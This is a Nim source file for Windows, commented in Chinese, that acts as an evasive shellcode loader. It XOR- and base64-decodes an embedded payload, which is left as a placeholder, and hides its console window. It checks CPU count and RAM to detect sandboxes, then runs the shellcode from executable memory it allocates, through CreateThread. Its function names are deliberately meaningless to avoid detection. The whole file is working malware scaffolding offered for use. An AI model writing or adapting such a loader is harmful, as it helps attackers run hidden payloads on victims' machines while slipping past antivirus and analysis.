import winim/lean,base64,strutils,math

#抄来的加密
const LOGINS_XOR_X: string = "F"
const LOGINS_XOR_STR {.strdefine.}: string = """89h9idsa-.;lopuhuisiad[;3ruw09er9weijo'-[9RUEAFJDOS'P[I-9EFWUOSRIQ-0[ARE']A[-0ES9UTOJ'GZEWS'AFE[-0RG'[O4[0R-JZ'PEA[IR=0P]E0IAP["""

proc `xor`(str1, str2: string): string =
  if str1.len != str2.len:
    raise newException(ValueError, "str1.len != str2.len")
  for idx in 0..str1.high:
    result.add(char(uint8(str1[idx]) xor uint8(str2[idx])))

let LOGINS_XOR: string = LOGINS_XOR_STR xor LOGINS_XOR_X.repeat(LOGINS_XOR_STR.len)

proc strXor(password: string, xorKey: string = LOGINS_XOR): string =
  let xorAmount: int = int(ceil(password.len / xorKey.len))
  let xorKey: string = xorKey.repeat(xorAmount)
  let passwordPadded: string = password.alignLeft(xorKey.len, '\0')
  return passwordPadded xor xorKey

proc showStr*(password: string, xorKey: string = LOGINS_XOR): string =
  return $strXor(base64.decode(password), xorKey).cstring

#加载主体
proc hskoasbkjldaskhoasdkj(shellcode: string) =
    var buf = shellcode
    var lpBufSize: SIZE_T = (SIZE_T)len(buf)
    var lpBuf = VirtualAlloc(NULL, lpBufSize, 0x3000, 0x00000040)
    RtlMoveMemory(lpBuf, &buf, len(buf))
    var lpStart: LPTHREADSTARTROUTINE = cast[proc(lpThreadParameter: LPVOID): DWORD{.stdcall.}](lpBuf)
    var hThread = CreateThread(NULL, 0, lpStart, lpBuf, 0, NULL)
    WaitForSingleObject(hThread, -1)

proc sdhohkojhijsdhjl(e: string) =
    let shjwbiobiulds = parseHexStr(e)
    echo "[*]  (" & $shjwbiobiulds.len() & " bytes) executed in memory."
    hskoasbkjldaskhoasdkj(shjwbiobiulds)

#获取cpu数量
proc huasidsiuohiuodsaih():bool =
  when defined(windows):
    type
      SYSTEM_INFO {.final, pure.} = object
        u1: int32
        dwPageSize: int32
        lpMinimumApplicationAddress: pointer
        lpMaximumApplicationAddress: pointer
        dwActiveProcessorMask: ptr int32
        dwNumberOfProcessors: int32
        dwProcessorType: int32
        dwAllocationGranularity: int32
        wProcessorLevel: int16
        wProcessorRevision: int16

    proc GetSystemInfo(lpSystemInfo: var SYSTEM_INFO) {.stdcall, dynlib: "kernel32", importc: "GetSystemInfo".}

    var
      si: SYSTEM_INFO
    GetSystemInfo(si)
    if si.dwNumberOfProcessors < 2:
        return false
    else:
        return true

#获取内存大小
proc ihojhhasioadsoiihodas():bool =
  when defined(windows):
    type
      TMEMORYSTATUSEX {.final, pure.} = object
        dwLength: int32
        dwMemoryLoad: int32
        ullTotalPhys: int64
        ullAvailPhys: int64
        ullTotalPageFile: int64
        ullAvailPageFile: int64
        ullTotalVirtual: int64
        ullAvailVirtual: int64
        ullAvailExtendedVirtual: int64
    proc globalMemoryStatusEx(lpBuffer: var TMEMORYSTATUSEX) {.stdcall, dynlib: "kernel32",importc: "GlobalMemoryStatusEx".}
    var statex: TMEMORYSTATUSEX
    statex.dwLength = sizeof(statex).int32
    globalMemoryStatusEx(statex)
    if (statex.ullTotalPhys shr 20) < 2048:
        return false
    else:
        return true

when defined(i386):
    let passwordXOr1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
elif defined(amd64):
    let passwordXOr1 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
when isMainModule:
    let hwnd = GetForegroundWindow()
    ShowWindow(hWnd, SW_HIDE);
    if huasidsiuohiuodsaih() and ihojhhasioadsoiihodas():
        let passwordXOr2Wrong: string = passwordXOr1.showStr()
        #echo passwordXOr2Wrong
        sdhohkojhijsdhjl(passwordXOr2Wrong)